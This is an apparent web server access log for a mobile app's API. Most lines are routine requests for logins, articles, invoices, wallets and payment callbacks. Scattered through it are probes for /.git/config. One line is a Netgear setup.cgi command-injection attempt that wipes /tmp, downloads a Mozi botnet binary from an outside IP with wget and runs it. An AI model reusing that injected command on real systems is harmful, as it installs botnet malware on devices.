::1 - - [26/Jun/2023:00:03:14 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:00:03:14 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:00:03:14 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:00:03:17 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:00:03:30 +0000] "GET /api/v1/articles/642d4c587c1330814fb76297? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:00:04:09 +0000] "GET /api/v1/articles/642d56517c1330814fb7635e? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:00:10:11 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 226 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:00:10:12 +0000] "GET /api/v1/ads? HTTP/1.0" 200 633 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:00:10:12 +0000] "GET /api/v1/articles? HTTP/1.0" 200 443373 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:00:10:16 +0000] "GET /api/v1/articles/642d4ce07c1330814fb762a6? HTTP/1.0" 200 10683 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:00:10:16 +0000] "GET /api/v1/articles/642d4c587c1330814fb76297? HTTP/1.0" 200 22271 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:00:10:30 +0000] "GET /api/v1/articles/642d4c587c1330814fb76297? HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:00:10:30 +0000] "GET /api/v1/articles/642d4c587c1330814fb76297? HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:00:22:47 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:00:37:21 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::1 - - [26/Jun/2023:00:37:40 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [26/Jun/2023:00:38:16 +0000] "POST /api/v1/users/register HTTP/1.0" 200 465 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::1 - - [26/Jun/2023:00:38:16 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 191 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [26/Jun/2023:00:38:41 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::1 - - [26/Jun/2023:00:38:53 +0000] "POST /api/v1/users/invoice/6498ddf8a32e8316d8280755 HTTP/1.0" 200 50 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [26/Jun/2023:00:38:53 +0000] "GET /api/v1/wallets/6498de1da32e8316d828075a? HTTP/1.0" 200 16521 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::1 - - [26/Jun/2023:00:39:38 +0000] "GET /api/v1/users/callbacks/6498ddf8a32e8316d8280755/20000?qpay_payment_id=930422441505254 HTTP/1.0" 200 230 "-" "node-fetch/1.0 (+https://github.com/bitinn/node-fetch)"
::ffff:127.0.0.1 - - [26/Jun/2023:00:39:54 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 230 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::1 - - [26/Jun/2023:00:39:54 +0000] "GET /api/v1/wallets/6498de1da32e8316d828075a? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [26/Jun/2023:00:40:00 +0000] "POST /api/v1/users/invoice/6498ddf8a32e8316d8280755 HTTP/1.0" 200 50 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::1 - - [26/Jun/2023:00:40:00 +0000] "GET /api/v1/wallets/6498de60a32e8316d8280770? HTTP/1.0" 200 16117 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [26/Jun/2023:00:40:26 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 230 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::1 - - [26/Jun/2023:00:40:32 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [26/Jun/2023:00:40:34 +0000] "POST /api/v1/users/invoice/6498ddf8a32e8316d8280755 HTTP/1.0" 200 50 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::1 - - [26/Jun/2023:00:40:34 +0000] "GET /api/v1/wallets/6498de81a32e8316d8280784? HTTP/1.0" 200 16081 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [26/Jun/2023:00:40:47 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 230 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::1 - - [26/Jun/2023:00:40:47 +0000] "GET /api/v1/users/logout? HTTP/1.0" 200 39 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [26/Jun/2023:00:40:47 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::1 - - [26/Jun/2023:00:41:01 +0000] "POST /api/v1/users/login HTTP/1.0" 200 504 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [26/Jun/2023:00:41:01 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [26/Jun/2023:00:41:01 +0000] "GET /api/v1/ads? HTTP/1.0" 200 633 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::1 - - [26/Jun/2023:00:41:01 +0000] "GET /api/v1/articles? HTTP/1.0" 200 443373 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::1 - - [26/Jun/2023:00:41:19 +0000] "GET /api/v1/articles/642d55507c1330814fb76325? HTTP/1.0" 200 3410 "-" "Sedu/1 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [26/Jun/2023:00:45:05 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:00:45:06 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:00:45:06 +0000] "GET /api/v1/articles? HTTP/1.0" 200 443373 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:00:52:03 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1399 Darwin/22.1.0"
::1 - - [26/Jun/2023:00:56:46 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:00:56:46 +0000] "GET /api/v1/articles? HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:00:56:46 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:00:56:48 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [26/Jun/2023:00:56:52 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:00:57:33 +0000] "POST /api/v1/users/register HTTP/1.0" 200 465 "-" "Sedu/1 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [26/Jun/2023:00:57:33 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 191 "-" "Sedu/1 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [26/Jun/2023:00:57:41 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [26/Jun/2023:00:58:02 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1399 Darwin/22.1.0"
::1 - - [26/Jun/2023:00:58:02 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1399 Darwin/22.1.0"
::ffff:127.0.0.1 - - [26/Jun/2023:00:58:03 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1399 Darwin/22.1.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:00:00 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [26/Jun/2023:01:00:05 +0000] "POST /api/v1/users/invoice/6498e27da32e8316d82807a4 HTTP/1.0" 200 50 "-" "Sedu/1 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:00:05 +0000] "GET /api/v1/wallets/6498e315a32e8316d82807af? HTTP/1.0" 200 16057 "-" "Sedu/1 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:00:21 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 230 "-" "Sedu/1 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [26/Jun/2023:01:00:21 +0000] "GET /api/v1/wallets/6498e315a32e8316d82807af? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [26/Jun/2023:01:00:27 +0000] "POST /api/v1/users/invoice/6498e27da32e8316d82807a4 HTTP/1.0" 200 50 "-" "Sedu/1 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:00:28 +0000] "GET /api/v1/wallets/6498e32ba32e8316d82807c3? HTTP/1.0" 200 16165 "-" "Sedu/1 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [26/Jun/2023:01:04:51 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1399 Darwin/22.1.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:05:03 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:01:05:03 +0000] "GET /api/v1/articles? HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:01:05:03 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [26/Jun/2023:01:05:10 +0000] "GET /api/v1/users/me? HTTP/1.0" 500 117 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [26/Jun/2023:01:07:41 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1399 Darwin/22.1.0"
::1 - - [26/Jun/2023:01:14:28 +0000] "GET /.git/config HTTP/1.0" 404 150 "-" "python-requests/2.28.2"
::ffff:127.0.0.1 - - [26/Jun/2023:01:14:28 +0000] "GET /.git/config HTTP/1.0" 404 150 "-" "python-requests/2.28.2"
::1 - - [26/Jun/2023:01:14:32 +0000] "GET /.git/config HTTP/1.0" 404 150 "-" "python-requests/2.28.2"
::ffff:127.0.0.1 - - [26/Jun/2023:01:14:32 +0000] "GET /.git/config HTTP/1.0" 404 150 "-" "python-requests/2.28.2"
::1 - - [26/Jun/2023:01:21:31 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::1 - - [26/Jun/2023:01:21:31 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:21:31 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:27:27 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1402.0.8 Darwin/22.2.0"
::1 - - [26/Jun/2023:01:27:45 +0000] "POST /api/v1/users/register HTTP/1.0" 200 465 "-" "Sedu/1 CFNetwork/1402.0.8 Darwin/22.2.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:27:45 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 191 "-" "Sedu/1 CFNetwork/1402.0.8 Darwin/22.2.0"
::1 - - [26/Jun/2023:01:27:59 +0000] "GET /api/v1/users/logout? HTTP/1.0" 200 39 "-" "Sedu/1 CFNetwork/1402.0.8 Darwin/22.2.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:27:59 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1402.0.8 Darwin/22.2.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:43:03 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:43:16 +0000] "POST /api/v1/users/register HTTP/1.0" 500 248 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:43:28 +0000] "POST /api/v1/users/register HTTP/1.0" 200 466 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:43:28 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 192 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:43:39 +0000] "GET /api/v1/users/logout? HTTP/1.0" 200 39 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:43:40 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:43:50 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:44:02 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:44:13 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:44:29 +0000] "POST /api/v1/users/login HTTP/1.0" 401 123 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:44:45 +0000] "POST /api/v1/users/register HTTP/1.0" 200 466 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:44:45 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 192 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:44:48 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:44:53 +0000] "POST /api/v1/users/invoice/6498ed8da32e8316d82807e7 HTTP/1.0" 200 50 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:44:53 +0000] "GET /api/v1/wallets/6498ed95a32e8316d82807ec? HTTP/1.0" 200 16129 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:45:13 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 231 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:45:13 +0000] "GET /api/v1/wallets/6498ed95a32e8316d82807ec? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:45:57 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:45:57 +0000] "GET /api/v1/wallets/6498ed95a32e8316d82807ec? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:46:30 +0000] "GET /api/v1/users/callbacks/6498ed8da32e8316d82807e7/20000?qpay_payment_id=418987391039342 HTTP/1.0" 200 231 "-" "node-fetch/1.0 (+https://github.com/bitinn/node-fetch)"
::1 - - [26/Jun/2023:01:46:34 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 231 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:46:34 +0000] "GET /api/v1/wallets/6498ed95a32e8316d82807ec? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:46:38 +0000] "POST /api/v1/users/invoice/6498ed8da32e8316d82807e7 HTTP/1.0" 200 50 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:46:38 +0000] "GET /api/v1/wallets/6498edfea32e8316d8280806? HTTP/1.0" 200 16101 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:46:45 +0000] "GET /api/v1/users/logout? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:46:45 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:46:59 +0000] "POST /api/v1/users/login HTTP/1.0" 200 505 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:47:00 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 231 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:47:00 +0000] "GET /api/v1/ads? HTTP/1.0" 200 633 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:47:00 +0000] "GET /api/v1/articles? HTTP/1.0" 200 443373 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:47:31 +0000] "GET /api/v1/articles/642d581c7c1330814fb76387? HTTP/1.0" 200 7596 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:48:25 +0000] "GET /api/v1/articles/642d59727c1330814fb76396? HTTP/1.0" 200 10524 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:49:46 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:50:09 +0000] "POST /api/v1/users/register HTTP/1.0" 500 248 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:50:21 +0000] "GET /api/v1/articles/642d5b917c1330814fb763ad? HTTP/1.0" 200 5031 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:50:50 +0000] "POST /api/v1/users/register HTTP/1.0" 500 253 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:50:51 +0000] "POST /api/v1/users/register HTTP/1.0" 500 253 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:50:52 +0000] "GET /api/v1/articles/642d789c7c1330814fb763e7? HTTP/1.0" 200 6163 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:51:27 +0000] "POST /api/v1/users/register HTTP/1.0" 200 464 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:51:28 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 190 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:51:43 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:52:01 +0000] "POST /api/v1/users/invoice/6498ef1fa32e8316d8280827 HTTP/1.0" 200 50 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:52:02 +0000] "GET /api/v1/wallets/6498ef41a32e8316d828082c? HTTP/1.0" 200 16239 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:52:18 +0000] "POST /api/v1/users/invoice/6498ef1fa32e8316d8280827 HTTP/1.0" 200 50 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:52:19 +0000] "GET /api/v1/wallets/6498ef52a32e8316d828083e? HTTP/1.0" 200 16159 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:52:23 +0000] "GET /api/v1/articles/642e2e6d7c1330814fb7646b? HTTP/1.0" 200 1619 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:53:13 +0000] "GET /api/v1/articles/642e321a7c1330814fb7648b? HTTP/1.0" 200 2221 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:53:20 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 229 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:53:20 +0000] "GET /api/v1/wallets/6498ef52a32e8316d828083e? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:53:55 +0000] "GET /api/v1/users/callbacks/6498ef1fa32e8316d8280827/20000?qpay_payment_id=718944644792162 HTTP/1.0" 200 229 "-" "node-fetch/1.0 (+https://github.com/bitinn/node-fetch)"
::ffff:127.0.0.1 - - [26/Jun/2023:01:54:07 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 229 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:54:07 +0000] "GET /api/v1/wallets/6498ef52a32e8316d828083e? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:54:13 +0000] "POST /api/v1/users/invoice/6498ef1fa32e8316d8280827 HTTP/1.0" 200 50 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:54:13 +0000] "GET /api/v1/wallets/6498efc5a32e8316d8280858? HTTP/1.0" 200 16083 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:54:19 +0000] "GET /api/v1/users/logout? HTTP/1.0" 200 39 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:54:19 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:54:25 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:54:37 +0000] "POST /api/v1/users/login HTTP/1.0" 200 503 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:54:38 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 229 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:54:38 +0000] "GET /api/v1/ads? HTTP/1.0" 200 633 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:54:38 +0000] "GET /api/v1/articles? HTTP/1.0" 200 443373 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:54:45 +0000] "GET /api/v1/articles/642d4c587c1330814fb76297? HTTP/1.0" 200 22271 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:55:23 +0000] "GET /api/v1/articles/642d4c587c1330814fb76297? HTTP/1.0" 200 22271 "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:58:36 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:58:36 +0000] "GET /api/v1/articles/642d4c587c1330814fb76297? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::ffff:127.0.0.1 - - [26/Jun/2023:01:58:36 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:58:36 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1408.0.4 Darwin/22.5.0"
::1 - - [26/Jun/2023:01:59:19 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://27.210.222.123:44972/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:127.0.0.1 - - [26/Jun/2023:01:59:44 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1335.0.3.2 Darwin/21.6.0"
::1 - - [26/Jun/2023:02:00:25 +0000] "POST /api/v1/users/register HTTP/1.0" 200 468 "-" "Sedu/1 CFNetwork/1335.0.3.2 Darwin/21.6.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:00:25 +0000] "GET /api/v1/users/me? HTTP/1.0" 200 194 "-" "Sedu/1 CFNetwork/1335.0.3.2 Darwin/21.6.0"
::1 - - [26/Jun/2023:02:00:32 +0000] "GET /api/v1/users/logout? HTTP/1.0" 200 39 "-" "Sedu/1 CFNetwork/1335.0.3.2 Darwin/21.6.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:00:32 +0000] "GET /api/v1/users/me? HTTP/1.0" 401 283 "-" "Sedu/1 CFNetwork/1335.0.3.2 Darwin/21.6.0"
::1 - - [26/Jun/2023:02:01:13 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:01:13 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::1 - - [26/Jun/2023:02:01:13 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:01:25 +0000] "GET /api/v1/users/me? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::1 - - [26/Jun/2023:02:01:25 +0000] "GET /api/v1/ads? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
::ffff:127.0.0.1 - - [26/Jun/2023:02:01:25 +0000] "GET /api/v1/articles? HTTP/1.0" 304 - "-" "Sedu/1 CFNetwork/1404.0.5 Darwin/22.3.0"
